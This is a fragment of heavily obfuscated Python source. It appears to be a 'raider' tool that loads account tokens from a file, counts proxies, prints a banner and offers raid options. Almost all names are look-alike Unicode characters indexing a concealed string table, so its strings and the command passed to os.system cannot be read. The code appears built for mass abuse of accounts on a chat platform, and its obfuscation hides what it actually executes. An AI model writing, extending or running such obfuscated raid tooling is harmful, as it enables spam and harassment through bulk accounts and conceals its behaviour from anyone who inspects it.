𝙄𝘭𝗹𝘔𝘕𝘭𝙉𝙡𝘔𝘐𝗠𝙄𝗠[42]}{𝗿}{𝙄𝙉𝙄𝗡𝙡𝗹𝘐𝗠𝘐𝙄𝘭𝘔𝗹𝘭𝙄𝘭𝗹𝘕𝙉𝙄𝙡𝙡𝘔𝗡𝘭𝘕𝗹𝙈𝘐𝘔𝘐𝗠[49]}{𝙡𝗰}{𝙄𝙉𝙄𝙉𝗹𝙡𝙄𝘔𝙄𝘐𝗹𝘔𝘭𝗹𝘐𝙡𝙡𝗡𝙉𝘐𝙡𝗹𝗠𝙉𝗹𝙉𝗹𝘔𝗜𝘔𝙄𝘔[33]}{𝘳}{𝙄𝙉𝘐𝘕𝙡𝙡𝘐𝘔𝘐𝙄𝙡𝙈𝗹𝘭𝗜𝗹𝘭𝙉𝗡𝗜𝗹𝘭𝗠𝘕𝘭𝙉𝗹𝗠𝘐𝗠𝗜𝙈[34]}{𝗹𝙘}{𝗜𝙉𝙄𝗡𝘭𝙡𝗜𝙈𝘐𝗜𝘭𝗠𝗹𝘭𝗜𝗹𝘭𝙉𝘕𝗜𝘭𝗹𝙈𝗡𝙡𝘕𝙡𝙈𝘐𝙈𝗜𝗠[44]}{𝙧}{𝘐𝙉𝙄𝗡𝗹𝗹𝙄𝗠𝘐𝗜𝗹𝙈𝙡𝙡𝙄𝙡𝙡𝘕𝘕𝙄𝗹𝙡𝙈𝘕𝗹𝗡𝙡𝘔𝗜𝙈𝙄𝙈[34]}{𝘭𝗰}{𝗜𝙉𝙄𝗡𝙡𝙡𝗜𝘔𝗜𝙄𝘭𝗠𝙡𝘭𝙄𝗹𝘭𝗡𝘕𝗜𝗹𝗹𝘔𝗡𝙡𝘕𝙡𝗠𝙄𝘔𝘐𝘔[42]}{𝗿}{𝙄𝗡𝗜𝘕𝘭𝙡𝘐𝗠𝙄𝘐𝘭𝙈𝘭𝘭𝗜𝘭𝘭𝗡𝗡𝙄𝙡𝗹𝙈𝙉𝘭𝘕𝙡𝘔𝙄𝙈𝙄𝘔[34]}{𝘭𝘤}{𝗜𝗡𝙄𝘕𝗹𝙡𝘐𝗠𝙄𝙄𝗹𝘔𝙡𝗹𝘐𝙡𝙡𝗡𝙉𝙄𝙡𝙡𝘔𝗡𝘭𝙉𝙡𝗠𝘐𝗠𝗜𝘔[45]}{𝘳}{𝗜𝘕𝘐𝙉𝗹𝗹𝘐𝘔𝗜𝘐𝘭𝗠𝘭𝘭𝗜𝘭𝗹𝙉𝗡𝙄𝘭𝘭𝘔𝘕𝘭𝘕𝗹𝗠𝗜𝙈𝘐𝘔[34]}{𝘭𝗰}{𝘐𝙉𝘐𝗡𝘭𝘭𝗜𝘔𝙄𝗜𝙡𝗠𝗹𝘭𝘐𝘭𝗹𝙉𝘕𝗜𝘭𝘭𝙈𝗡𝘭𝙉𝙡𝘔𝘐𝗠𝘐𝘔[42]}{𝘳}{𝙄𝙉𝘐𝙉𝙡𝘭𝘐𝘔𝙄𝗜𝘭𝘔𝘭𝙡𝗜𝗹𝘭𝙉𝘕𝗜𝘭𝙡𝘔𝙉𝙡𝗡𝗹𝙈𝘐𝗠𝗜𝘔[34]}{𝗹𝘤}{𝗜𝘕𝙄𝗡𝘭𝙡𝙄𝙈𝗜𝘐𝙡𝙈𝗹𝗹𝗜𝙡𝙡𝙉𝙉𝙄𝙡𝗹𝗠𝙉𝗹𝗡𝘭𝙈𝗜𝘔𝙄𝙈[50]}{𝗿}{𝘐𝘕𝙄𝘕𝙡𝘭𝗜𝗠𝙄𝘐𝘭𝙈𝙡𝘭𝗜𝙡𝙡𝗡𝘕𝗜𝗹𝗹𝙈𝗡𝙡𝙉𝙡𝗠𝘐𝘔𝗜𝙈[46]}{𝘭𝘤}{𝘐𝘕𝗜𝘕𝙡𝗹𝘐𝘔𝙄𝙄𝘭𝗠𝙡𝘭𝘐𝘭𝘭𝗡𝗡𝗜𝗹𝗹𝙈𝘕𝙡𝗡𝘭𝗠𝘐𝘔𝘐𝘔[50]}{𝘳}{𝘐𝘕𝗜𝙉𝙡𝙡𝘐𝙈𝙄𝙄𝘭𝗠𝘭𝗹𝗜𝙡𝘭𝗡𝙉𝙄𝙡𝘭𝙈𝗡𝘭𝘕𝗹𝘔𝘐𝙈𝙄𝘔[34]}{𝙡𝙘}{𝙄𝗡𝘐𝗡𝙡𝙡𝙄𝙈𝗜𝘐𝘭𝙈𝘭𝗹𝗜𝙡𝗹𝗡𝘕𝙄𝗹𝗹𝗠𝗡𝗹𝙉𝘭𝘔𝘐𝗠𝙄𝙈[42]}{𝘳}{𝗜𝘕𝘐𝙉𝗹𝗹𝘐𝘔𝙄𝘐𝙡𝙈𝗹𝘭𝘐𝗹𝘭𝙉𝗡𝘐𝗹𝙡𝘔𝗡𝘭𝘕𝗹𝘔𝘐𝘔𝗜𝘔[51]}{𝙡𝙘}{𝘐𝘕𝗜𝙉𝗹𝘭𝗜𝙈𝗜𝘐𝘭𝗠𝗹𝘭𝗜𝗹𝘭𝙉𝘕𝗜𝗹𝙡𝘔𝗡𝗹𝘕𝗹𝘔𝗜𝙈𝘐𝙈[52]}{𝘳}{𝗜𝘕𝙄𝗡𝙡𝗹𝙄𝗠𝗜𝙄𝗹𝗠𝗹𝘭𝙄𝙡𝙡𝗡𝗡𝙄𝙡𝘭𝗠𝙉𝙡𝙉𝗹𝗠𝙄𝙈𝗜𝘔[34]}{𝘭𝘤}{𝘐𝘕𝗜𝙉𝘭𝙡𝙄𝗠𝗜𝙄𝙡𝙈𝙡𝙡𝘐𝙡𝙡𝘕𝙉𝙄𝙡𝙡𝗠𝘕𝗹𝙉𝘭𝘔𝗜𝘔𝗜𝘔[42]}{𝙧}{𝗜𝙉𝗜𝗡𝙡𝘭𝙄𝘔𝗜𝘐𝙡𝗠𝗹𝘭𝘐𝙡𝙡𝗡𝙉𝘐𝘭𝙡𝘔𝘕𝘭𝘕𝘭𝗠𝗜𝘔𝗜𝗠[34]}{𝘭𝙘}{𝗜𝗡𝘐𝙉𝘭𝗹𝗜𝙈𝘐𝘐𝗹𝘔𝙡𝗹𝗜𝘭𝘭𝗡𝗡𝙄𝙡𝘭𝘔𝗡𝙡𝗡𝘭𝗠𝗜𝙈𝗜𝙈[53]}{𝙧}{𝙄𝘕𝙄𝙉𝙡𝘭𝗜𝗠𝘐𝗜𝙡𝘔𝗹𝘭𝘐𝗹𝙡𝗡𝗡𝘐𝗹𝘭𝗠𝙉𝗹𝗡𝗹𝙈𝘐𝙈𝗜𝙈[34]}{𝙡𝘤}{𝘐𝘕𝗜𝙉𝗹𝘭𝙄𝘔𝘐𝙄𝙡𝙈𝙡𝘭𝘐𝗹𝘭𝘕𝙉𝗜𝙡𝙡𝘔𝗡𝙡𝗡𝙡𝗠𝗜𝗠𝙄𝗠[44]}{𝗿}{𝗜𝗡𝗜𝙉𝘭𝗹𝙄𝘔𝙄𝗜𝘭𝘔𝘭𝙡𝘐𝙡𝗹𝘕𝙉𝙄𝙡𝗹𝘔𝙉𝗹𝗡𝘭𝘔𝙄𝗠𝘐𝘔[34]}{𝘭𝙘}{𝙄𝘕𝙄𝗡𝘭𝘭𝗜𝘔𝘐𝘐𝗹𝗠𝘭𝗹𝗜𝘭𝙡𝙉𝗡𝗜𝗹𝘭𝘔𝘕𝙡𝙉𝘭𝙈𝗜𝗠𝗜𝘔[42]}{𝘳}{𝙄𝙉𝙄𝙉𝙡𝗹𝘐𝗠𝙄𝗜𝙡𝙈𝘭𝘭𝗜𝗹𝘭𝙉𝙉𝙄𝗹𝗹𝙈𝘕𝙡𝗡𝙡𝘔𝙄𝙈𝗜𝙈[34]}{𝘭𝘤}{𝙄𝗡𝙄𝙉𝙡𝘭𝙄𝗠𝗜𝗜𝗹𝙈𝗹𝘭𝗜𝙡𝘭𝗡𝗡𝙄𝗹𝙡𝘔𝘕𝙡𝘕𝘭𝙈𝙄𝙈𝙄𝙈[45]}{𝗿}{𝘐𝙉𝙄𝘕𝙡𝗹𝘐𝙈𝘐𝗜𝗹𝙈𝗹𝙡𝗜𝘭𝘭𝘕𝘕𝙄𝘭𝘭𝗠𝘕𝗹𝙉𝙡𝙈𝘐𝗠𝗜𝙈[34]}{𝗹𝘤}{𝗜𝗡𝘐𝘕𝗹𝘭𝙄𝘔𝙄𝙄𝘭𝘔𝙡𝗹𝘐𝗹𝗹𝙉𝘕𝗜𝗹𝙡𝗠𝘕𝘭𝙉𝗹𝗠𝙄𝘔𝘐𝘔[42]}{𝙧}{𝘐𝘕𝙄𝘕𝙡𝗹𝗜𝙈𝙄𝘐𝗹𝘔𝙡𝘭𝙄𝘭𝘭𝘕𝗡𝙄𝙡𝙡𝙈𝗡𝙡𝙉𝗹𝗠𝙄𝘔𝙄𝘔[34]}{𝙡𝗰}{𝘐𝗡𝗜𝘕𝗹𝘭𝙄𝘔𝗜𝙄𝙡𝘔𝗹𝙡𝗜𝙡𝙡𝗡𝗡𝗜𝙡𝙡𝙈𝙉𝗹𝙉𝘭𝙈𝘐𝙈𝙄𝙈[54]}{𝙧}{𝙄𝗡𝗜𝘕𝘭𝘭𝙄𝗠𝙄𝘐𝘭𝙈𝘭𝘭𝙄𝗹𝙡𝙉𝗡𝗜𝘭𝙡𝗠𝙉𝗹𝙉𝗹𝘔𝗜𝗠𝙄𝗠[34]}{𝙡𝙘}{𝗜𝙉𝗜𝗡𝘭𝗹𝙄𝘔𝗜𝙄𝗹𝘔𝗹𝗹𝘐𝙡𝗹𝗡𝙉𝗜𝗹𝙡𝗠𝙉𝗹𝗡𝗹𝗠𝙄𝘔𝙄𝙈[55]}{𝗿}{𝙄𝙉𝙄𝗡𝙡𝗹𝙄𝘔𝘐𝙄𝙡𝗠𝘭𝗹𝗜𝙡𝗹𝗡𝙉𝙄𝗹𝘭𝘔𝙉𝗹𝘕𝗹𝙈𝙄𝘔𝗜𝗠[34]}{𝗹𝗰}{𝘐𝘕𝗜𝗡𝙡𝘭𝙄𝗠𝘐𝙄𝘭𝗠𝙡𝗹𝙄𝗹𝗹𝗡𝙉𝘐𝗹𝗹𝗠𝗡𝗹𝘕𝘭𝙈𝙄𝗠𝗜𝙈[42]}{𝗿}{𝗜𝘕𝘐𝗡𝗹𝘭𝘐𝙈𝗜𝗜𝗹𝙈𝗹𝘭𝙄𝗹𝘭𝗡𝘕𝗜𝗹𝙡𝘔𝙉𝙡𝘕𝙡𝙈𝘐𝘔𝗜𝘔[51]}{𝗹𝗰}{𝗜𝘕𝙄𝘕𝗹𝘭𝙄𝘔𝘐𝙄𝗹𝙈𝗹𝗹𝘐𝙡𝙡𝘕𝗡𝘐𝗹𝗹𝗠𝗡𝗹𝘕𝙡𝗠𝙄𝗠𝙄𝗠[41]}{𝗿}{𝗜𝘕𝙄𝙉𝙡𝗹𝗜𝗠𝘐𝙄𝗹𝗠𝗹𝗹𝘐𝗹𝘭𝙉𝙉𝙄𝘭𝘭𝘔𝗡𝘭𝗡𝗹𝗠𝘐𝘔𝙄𝘔[34]}{𝗹𝘤}{𝘐𝙉𝘐𝗡𝘭𝙡𝘐𝗠𝘐𝗜𝘭𝙈𝗹𝙡𝗜𝗹𝘭𝗡𝙉𝙄𝗹𝘭𝙈𝙉𝙡𝘕𝘭𝘔𝘐𝗠𝘐𝙈[42]}{𝙧}{𝙄𝘕𝙄𝙉𝗹𝘭𝘐𝘔𝗜𝙄𝗹𝗠𝗹𝗹𝘐𝗹𝗹𝘕𝘕𝙄𝗹𝘭𝘔𝙉𝗹𝗡𝗹𝘔𝗜𝙈𝙄𝙈[36]}{𝗹𝗰}{𝗜𝗡𝙄𝙉𝙡𝘭𝗜𝗠𝘐𝙄𝘭𝗠𝘭𝙡𝙄𝙡𝘭𝘕𝙉𝗜𝘭𝗹𝘔𝗡𝗹𝗡𝘭𝗠𝗜𝙈𝙄𝗠[35]}{𝗿}{𝘐𝗡𝗜𝗡𝙡𝙡𝙄𝙈𝗜𝙄𝗹𝗠𝗹𝘭𝘐𝘭𝗹𝗡𝙉𝙄𝘭𝙡𝘔𝗡𝘭𝙉𝗹𝙈𝗜𝘔𝙄𝗠[36]}{𝗹𝗰}{𝘐𝘕𝗜𝘕𝙡𝘭𝘐𝗠𝙄𝙄𝗹𝙈𝘭𝙡𝘐𝙡𝙡𝘕𝙉𝗜𝘭𝙡𝘔𝗡𝙡𝘕𝗹𝘔𝙄𝙈𝘐𝗠[35]}{𝗿}{𝙄𝙉𝙄𝘕𝙡𝗹𝙄𝘔𝗜𝗜𝘭𝘔𝗹𝙡𝗜𝘭𝘭𝗡𝗡𝘐𝘭𝙡𝘔𝘕𝘭𝗡𝙡𝘔𝙄𝗠𝙄𝘔[34]}{𝙡𝗰}{𝙄𝘕𝗜𝗡𝙡𝘭𝗜𝗠𝙄𝙄𝗹𝗠𝗹𝘭𝗜𝗹𝘭𝙉𝗡𝙄𝗹𝘭𝙈𝗡𝘭𝗡𝙡𝙈𝗜𝙈𝘐𝙈[54]}{𝗿}{𝙄𝗡𝗜𝗡𝘭𝗹𝘐𝗠𝘐𝙄𝙡𝙈𝘭𝙡𝘐𝗹𝙡𝘕𝗡𝙄𝙡𝗹𝗠𝗡𝙡𝙉𝗹𝘔𝗜𝙈𝗜𝙈[56]}{𝙡𝙘}{𝗜𝗡𝗜𝙉𝙡𝗹𝙄𝙈𝙄𝘐𝙡𝗠𝙡𝘭𝙄𝗹𝘭𝙉𝘕𝗜𝘭𝗹𝗠𝗡𝗹𝘕𝙡𝘔𝘐𝙈𝘐𝙈[55]}{𝘳}{𝗜𝘕𝗜𝘕𝙡𝗹𝗜𝙈𝗜𝗜𝗹𝗠𝗹𝘭𝗜𝙡𝙡𝙉𝘕𝗜𝘭𝙡𝘔𝘕𝘭𝘕𝙡𝗠𝘐𝗠𝘐𝘔[34]}{𝙡𝘤}{𝘐𝗡𝙄𝘕𝗹𝙡𝙄𝙈𝗜𝘐𝗹𝗠𝗹𝗹𝘐𝘭𝗹𝘕𝗡𝘐𝙡𝗹𝙈𝘕𝘭𝘕𝗹𝙈𝘐𝘔𝙄𝗠[57]}{𝘳}{𝘐𝗡𝙄𝙉𝘭𝘭𝘐𝘔𝘐𝙄𝘭𝘔𝗹𝗹𝘐𝘭𝙡𝘕𝗡𝗜𝙡𝗹𝘔𝙉𝘭𝘕𝗹𝗠𝙄𝙈𝘐𝙈[34]}{𝙡𝙘}{𝙄𝘕𝙄𝙉𝙡𝙡𝗜𝗠𝙄𝗜𝗹𝙈𝙡𝙡𝙄𝘭𝗹𝗡𝘕𝗜𝙡𝙡𝙈𝘕𝙡𝙉𝙡𝘔𝘐𝘔𝙄𝘔[58]}'
with 𝗼𝗽𝗲𝙣(𝙄𝙉𝘐𝘕𝘭𝘭𝗜𝗠𝙄𝗜𝘭𝙈𝗹𝗹𝗜𝙡𝗹𝘕𝗡𝙄𝙡𝙡𝘔𝙉𝗹𝙉𝙡𝙈𝙄𝗠𝘐𝙈[59], 𝙄𝗡𝙄𝗡𝘭𝘭𝙄𝘔𝗜𝘐𝙡𝙈𝙡𝙡𝗜𝗹𝙡𝙉𝘕𝘐𝗹𝙡𝗠𝙉𝘭𝗡𝗹𝙈𝗜𝘔𝗜𝘔[30]) as 𝗳:
    𝘁𝙤𝘬𝙚𝗻𝘀 = 𝙛.read().splitlines()

def wrapper(func):

    def wrapper(*args, **kwargs):
        𝙘𝙤𝘯𝘀𝗼𝘭𝗲.render_ascii()
        𝙧𝗲𝙨𝙪𝘭𝘁 = 𝘧𝘶𝙣𝘤(*𝘢𝘳𝘨𝘴, **𝙠𝙬𝘢𝗿𝘨𝙨)
        return 𝙧𝗲𝙨𝙪𝗹𝙩
    return 𝘄𝙧𝘢𝙥𝗽𝗲𝘳

class Render:

    def __init__(self):
        𝘴𝙚𝙩𝗮𝙩𝙩𝗿(𝘀𝙚𝙡𝘧, 'size', 𝘰𝘀.get_terminal_size().columns)

    def render_ascii(self):
        𝗼𝘀.system(𝘐𝘕𝗜𝘕𝙡𝗹𝙄𝙈𝗜𝗜𝘭𝗠𝗹𝘭𝘐𝗹𝙡𝘕𝘕𝘐𝙡𝗹𝗠𝗡𝘭𝙉𝘭𝘔𝘐𝘔𝗜𝘔[1])
        with 𝙤𝗽𝙚𝘯(𝘐𝗡𝘐𝙉𝘭𝗹𝘐𝙈𝙄𝘐𝗹𝗠𝘭𝗹𝗜𝘭𝙡𝙉𝘕𝗜𝙡𝘭𝘔𝗡𝗹𝘕𝗹𝘔𝗜𝗠𝘐𝙈[59], 𝙄𝗡𝘐𝘕𝘭𝗹𝘐𝗠𝗜𝗜𝙡𝗠𝙡𝘭𝗜𝗹𝘭𝗡𝗡𝘐𝗹𝘭𝘔𝘕𝙡𝗡𝗹𝘔𝙄𝙈𝘐𝙈[30]) as 𝙛:
            𝘵𝙤𝘬𝗲𝗻𝘴 = 𝙛.read().splitlines()
        𝘦𝙙𝘨𝗲𝘀 = [𝗜𝗡𝗜𝘕𝗹𝘭𝗜𝘔𝘐𝘐𝙡𝙈𝘭𝘭𝙄𝙡𝗹𝙉𝙉𝘐𝙡𝙡𝙈𝗡𝗹𝙉𝗹𝙈𝙄𝗠𝗜𝘔[35], 𝘐𝙉𝘐𝙉𝗹𝘭𝙄𝘔𝗜𝗜𝙡𝙈𝗹𝗹𝗜𝙡𝙡𝙉𝘕𝘐𝙡𝙡𝗠𝗡𝗹𝙉𝗹𝙈𝘐𝘔𝘐𝙈[42], 𝙄𝗡𝙄𝘕𝙡𝗹𝙄𝙈𝗜𝙄𝙡𝙈𝙡𝘭𝙄𝘭𝗹𝘕𝙉𝗜𝙡𝗹𝙈𝗡𝗹𝘕𝘭𝘔𝗜𝗠𝘐𝗠[60], 𝙄𝘕𝘐𝘕𝘭𝙡𝗜𝗠𝘐𝙄𝘭𝘔𝗹𝘭𝘐𝘭𝗹𝙉𝗡𝘐𝙡𝘭𝘔𝗡𝘭𝙉𝗹𝙈𝗜𝙈𝙄𝘔[61], 𝗜𝙉𝘐𝘕𝙡𝗹𝘐𝙈𝘐𝘐𝙡𝗠𝙡𝘭𝘐𝙡𝗹𝙉𝙉𝘐𝙡𝙡𝘔𝗡𝘭𝘕𝘭𝘔𝗜𝘔𝘐𝗠[62], 𝙄𝗡𝗜𝘕𝙡𝗹𝙄𝙈𝘐𝘐𝗹𝗠𝗹𝙡𝙄𝘭𝗹𝙉𝘕𝗜𝘭𝙡𝗠𝗡𝗹𝘕𝙡𝙈𝗜𝙈𝗜𝗠[50]]
        𝘁𝗶𝘁𝗹𝙚 = f"{𝘐𝙉𝗜𝘕𝘭𝙡𝘐𝘔𝘐𝗜𝗹𝗠𝙡𝙡𝘐𝘭𝘭𝘕𝙉𝙄𝘭𝙡𝙈𝙉𝗹𝘕𝘭𝗠𝙄𝙈𝘐𝘔[63]}{𝗜𝘕𝘐𝗡𝙡𝙡𝗜𝘔𝗜𝙄𝘭𝙈𝙡𝗹𝘐𝘭𝗹𝘕𝙉𝘐𝘭𝗹𝙈𝘕𝗹𝗡𝙡𝙈𝘐𝗠𝙄𝙈[64].center(𝘴𝘦𝗹𝘧.size)}{𝙄𝗡𝘐𝙉𝗹𝘭𝗜𝘔𝙄𝘐𝘭𝗠𝙡𝘭𝗜𝗹𝘭𝙉𝗡𝙄𝙡𝘭𝙈𝘕𝙡𝙉𝘭𝘔𝙄𝘔𝗜𝘔[63]}{𝘐𝘕𝘐𝘕𝘭𝗹𝙄𝗠𝙄𝗜𝗹𝗠𝘭𝘭𝙄𝗹𝗹𝙉𝗡𝘐𝘭𝘭𝘔𝙉𝗹𝗡𝗹𝙈𝘐𝘔𝙄𝙈[65].center(𝘀𝗲𝗹𝘧.size)}{𝘐𝙉𝗜𝘕𝙡𝙡𝘐𝙈𝘐𝘐𝘭𝗠𝘭𝘭𝙄𝙡𝗹𝙉𝘕𝘐𝘭𝙡𝘔𝗡𝗹𝙉𝘭𝙈𝗜𝙈𝗜𝗠[63]}{𝙄𝘕𝙄𝘕𝙡𝘭𝘐𝗠𝘐𝙄𝘭𝘔𝗹𝙡𝘐𝙡𝙡𝘕𝙉𝗜𝗹𝗹𝗠𝘕𝙡𝘕𝙡𝙈𝘐𝗠𝙄𝙈[66].center(𝘀𝗲𝗹𝙛.size)}{𝗜𝙉𝗜𝙉𝗹𝗹𝘐𝙈𝙄𝘐𝗹𝙈𝘭𝗹𝘐𝗹𝙡𝗡𝗡𝘐𝘭𝘭𝗠𝘕𝙡𝘕𝙡𝗠𝗜𝙈𝘐𝙈[63]}{𝘐𝘕𝗜𝙉𝙡𝗹𝗜𝗠𝙄𝘐𝘭𝙈𝙡𝗹𝗜𝙡𝗹𝗡𝗡𝘐𝗹𝙡𝘔𝗡𝗹𝙉𝗹𝙈𝗜𝘔𝘐𝘔[67].center(𝙨𝗲𝙡𝗳.size)}{𝙄𝙉𝘐𝗡𝙡𝙡𝙄𝘔𝘐𝘐𝗹𝗠𝙡𝙡𝘐𝗹𝘭𝗡𝘕𝘐𝗹𝘭𝙈𝙉𝙡𝘕𝗹𝗠𝙄𝗠𝙄𝘔[63]}{𝘐𝙉𝘐𝘕𝗹𝘭𝙄𝗠𝗜𝙄𝙡𝙈𝘭𝙡𝘐𝘭𝘭𝗡𝙉𝙄𝗹𝗹𝘔𝗡𝘭𝘕𝘭𝙈𝘐𝙈𝙄𝘔[68].center(𝙨𝘦𝙡𝙛.size)}{𝘐𝗡𝙄𝙉𝘭𝘭𝙄𝘔𝘐𝘐𝘭𝘔𝘭𝗹𝘐𝙡𝗹𝗡𝙉𝗜𝙡𝙡𝙈𝗡𝘭𝘕𝙡𝙈𝙄𝙈𝘐𝙈[63]}{𝙄𝘕𝗜𝗡𝙡𝗹𝗜𝗠𝗜𝗜𝗹𝗠𝗹𝗹𝗜𝗹𝗹𝙉𝘕𝙄𝘭𝗹𝙈𝘕𝘭𝘕𝙡𝗠𝘐𝗠𝙄𝘔[69].center(𝘴𝙚𝘭𝗳.size)}{𝙄𝙉𝘐𝙉𝗹𝘭𝗜𝙈𝘐𝗜𝙡𝘔𝗹𝗹𝗜𝗹𝘭𝘕𝙉𝘐𝙡𝙡𝗠𝗡𝙡𝙉𝙡𝗠𝙄𝙈𝘐𝙈[70]}{f'{𝙄𝙉𝗜𝘕𝘭𝙡𝙄𝘔𝗜𝗜𝗹𝙈𝙡𝗹𝘐𝙡𝗹𝗡𝙉𝙄𝘭𝘭𝙈𝙉𝗹𝘕𝘭𝘔𝙄𝘔𝙄𝗠[71]}{𝘳}{𝙄𝘕𝘐𝙉𝘭𝙡𝙄𝘔𝘐𝙄𝗹𝘔𝗹𝗹𝘐𝗹𝗹𝘕𝘕𝘐𝙡𝘭𝙈𝙉𝘭𝙉𝗹𝙈𝙄𝘔𝗜𝘔[72]}{𝗹𝙘}{𝙡𝘦𝙣(𝙩𝗼𝙠𝙚𝗻𝘴)}{𝙧}{𝘐𝙉𝗜𝘕𝘭𝗹𝘐𝙈𝙄𝙄𝙡𝙈𝙡𝗹𝘐𝗹𝗹𝗡𝗡𝗜𝘭𝘭𝘔𝙉𝘭𝙉𝘭𝙈𝘐𝘔𝙄𝙈[73]}{𝙡𝙘}{𝘭𝙚𝙣(𝗽𝗿𝘰𝘅𝗶𝘦𝙨)}{𝙧}{𝗜𝙉𝙄𝗡𝙡𝗹𝗜𝘔𝙄𝘐𝗹𝙈𝗹𝗹𝗜𝗹𝗹𝙉𝘕𝗜𝗹𝘭𝗠𝘕𝙡𝙉𝙡𝙈𝗜𝙈𝗜𝗠[74]}'.center(𝙨𝗲𝘭𝘧.size)}{𝗜𝗡𝙄𝗡𝙡𝗹𝙄𝘔𝗜𝘐𝘭𝙈𝘭𝘭𝗜𝗹𝙡𝙉𝗡𝘐𝘭𝗹𝘔𝙉𝘭𝘕𝘭𝗠𝗜𝘔𝗜𝘔[63]}"
        for 𝙚𝘥𝗴𝗲 in 𝘦𝗱𝘨𝘦𝘴:
            𝘁𝗶𝘁𝗹𝘦 = 𝙩𝗶𝙩𝘭𝙚.replace(𝙚𝗱𝗴𝘦, f'{𝙁𝙤𝘳𝘦.LIGHTCYAN_EX}{𝗲𝙙𝙜𝘦}{𝗙𝙤𝗿𝙚.RESET}')
        𝙥𝘳𝘪𝘯𝙩(𝘁𝙞𝘵𝘭𝙚)

    def raider_options(self):
        𝙚𝗱𝗴𝙚𝘀 = [𝘐𝗡𝙄𝘕𝙡𝙡𝗜𝙈𝘐𝗜𝙡𝘔𝙡𝗹𝗜𝗹𝙡𝙉𝘕𝙄𝗹𝗹𝘔𝙉𝗹𝙉𝙡𝙈𝘐𝘔𝘐𝘔[75], 𝙄𝘕𝘐𝘕𝘭𝗹𝙄𝙈𝙄𝘐𝙡𝘔𝙡𝗹𝗜𝗹𝙡𝗡𝗡𝙄𝙡𝘭𝙈𝘕𝘭𝙉𝘭𝙈𝘐𝘔𝘐𝙈[76], 𝘐𝗡𝗜𝘕𝙡𝗹𝘐𝘔𝗜𝙄𝘭𝘔𝗹𝙡𝗜𝘭𝘭𝘕𝘕𝘐𝘭𝘭𝗠𝗡𝗹𝙉𝗹𝗠𝘐𝘔𝙄𝗠[77], 𝙄𝗡𝗜𝘕𝗹𝙡𝗜𝙈𝘐𝗜𝘭𝙈𝘭𝘭𝘐𝗹𝙡𝗡𝗡𝘐𝗹𝙡𝘔𝗡𝗹𝗡𝗹𝘔𝘐𝙈𝗜𝗠[78], 𝙄𝙉𝘐𝗡𝗹𝘭𝙄𝘔𝗜𝘐𝙡𝘔𝗹𝘭𝗜𝗹𝘭𝘕𝘕𝘐𝘭𝗹𝘔𝙉𝙡𝙉𝘭𝗠𝙄𝗠𝗜𝗠[79], 𝙄𝗡𝗜𝙉𝗹𝗹𝙄𝗠𝘐𝘐𝗹𝙈𝗹𝙡𝘐𝘭𝘭𝙉𝗡𝘐𝙡𝗹𝙈𝙉𝘭𝘕𝙡𝘔𝗜𝘔𝙄𝙈[80], 𝘐𝙉𝙄𝗡𝘭𝗹𝙄𝘔𝘐𝗜𝗹𝙈𝗹𝘭𝘐𝗹𝙡𝘕𝗡𝙄𝙡𝗹𝘔𝙉𝗹𝗡𝙡𝙈𝘐𝘔𝙄𝘔[81], 𝙄𝙉𝙄𝗡𝗹𝙡𝘐𝗠𝘐𝗜𝙡𝘔𝙡𝘭𝗜𝙡𝙡𝗡𝙉𝙄𝙡𝙡𝙈𝗡𝙡𝘕𝘭𝗠𝘐𝙈𝘐𝙈[82]]
        𝘵𝘪𝘁𝗹𝗲 = f'{𝘐𝘕𝙄𝘕𝙡𝗹𝘐𝘔𝘐𝘐𝗹𝗠𝙡𝗹𝘐𝘭𝙡𝗡𝘕𝙄𝙡𝗹𝗠𝙉𝘭𝙉𝘭𝙈𝗜𝗠𝘐𝘔[83].center(𝘀𝙚𝘭𝗳.size)}{𝙄𝙉𝘐𝙉𝘭𝗹𝗜𝙈𝘐𝙄𝘭𝙈𝘭𝙡𝗜𝘭𝙡𝙉𝗡𝘐𝙡𝗹𝗠𝙉𝙡𝙉𝗹𝗠𝗜𝗠𝙄𝗠[63]}{𝘐𝘕𝗜𝗡𝙡𝙡𝙄𝙈𝘐𝘐𝘭𝘔𝘭𝙡𝘐𝘭𝗹𝘕𝙉𝙄𝙡𝙡𝗠𝗡𝙡𝗡𝗹𝗠𝘐𝘔𝘐𝗠[84].center(𝘴𝗲𝘭𝗳.size)}{𝗜𝗡𝙄𝗡𝙡𝙡𝗜𝙈𝙄𝙄𝗹𝗠𝙡𝗹𝙄𝗹𝗹𝗡𝙉𝙄𝙡𝘭𝙈𝘕𝘭𝙉𝘭𝘔𝗜𝗠𝘐𝗠[63]}{𝗜𝗡𝙄𝙉𝗹𝙡𝘐𝙈𝗜𝘐𝙡𝘔𝙡𝗹𝙄𝘭𝘭𝙉𝗡𝗜𝗹𝙡𝙈𝘕𝙡𝙉𝙡𝘔𝘐𝗠𝗜𝙈[85].center(𝘀𝗲𝘭𝙛.size)}{𝗜𝗡𝗜𝙉𝗹𝙡𝙄𝗠𝙄𝙄𝗹𝙈𝘭𝘭𝗜𝘭𝘭𝙉𝗡𝗜𝗹𝗹𝗠𝘕𝗹𝙉𝙡𝙈𝘐𝗠𝘐𝘔[63]}{𝘐𝘕𝘐𝘕𝗹𝙡𝙄𝗠𝘐𝗜𝗹𝗠𝘭𝗹𝘐𝙡𝙡𝙉𝘕𝙄𝘭𝗹𝘔𝘕𝙡𝗡𝘭𝗠𝘐𝗠𝘐𝘔[86].center(𝙨𝗲𝗹𝗳.size)}{𝘐𝘕𝙄𝘕𝗹𝗹𝙄𝙈𝙄𝘐𝘭𝘔𝘭𝙡𝗜𝗹𝘭𝘕𝘕𝘐𝘭𝗹𝗠𝗡𝘭𝘕𝙡𝙈𝙄𝙈𝗜𝘔[63]}{𝘐𝘕𝙄𝗡𝙡𝙡𝗜𝙈𝘐𝙄𝘭𝘔𝙡𝗹𝘐𝗹𝗹𝙉𝗡𝘐𝗹𝘭𝙈𝙉𝗹𝗡𝗹𝙈𝗜𝘔𝗜𝙈[87].center(𝙨𝗲𝘭𝘧.size)}{𝘐𝙉𝘐𝘕𝙡𝗹𝙄𝗠𝙄𝙄𝗹𝗠𝗹𝙡𝗜𝗹𝘭𝗡𝘕𝘐𝗹𝙡𝘔𝙉𝙡𝗡𝘭𝘔𝘐𝙈𝗜𝘔[63]}{𝗜𝙉𝘐𝙉𝘭𝙡𝘐𝗠𝘐𝘐𝗹𝙈𝙡𝘭𝙄𝙡𝘭𝘕𝙉𝘐𝘭𝙡𝗠𝗡𝙡𝙉𝗹𝙈𝘐𝙈𝘐𝘔[88].center(𝘀𝗲𝗹𝙛.size)}{𝙄𝗡𝙄𝘕𝗹𝘭𝗜𝗠𝘐𝗜